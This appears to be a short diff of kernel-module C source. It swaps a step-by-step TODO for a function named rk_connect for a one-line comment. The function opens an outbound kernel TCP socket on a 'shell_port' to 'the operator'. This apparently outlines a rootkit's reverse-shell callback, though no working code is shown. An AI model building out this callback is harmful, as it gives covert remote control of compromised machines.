@@ -12,13 +12,4 @@
 /* Outbound TCP connect                                                */
 /* ------------------------------------------------------------------ */
 
-/*
- * TODO: Implement rk_connect.
- *
- * 1. Build a struct sockaddr_in with AF_INET, htons(shell_port),
- *    and in_aton(peer_addr_str).
- * 2. Create a kernel TCP socket with sock_create_kern.
- * 3. Connect with kernel_connect.
- * 4. Return the socket on success, ERR_PTR(error) on failure.
- *    Release the socket before returning an error from connect.
- */
+// Implement rk_connect: create a kernel TCP socket and connect to the operator.
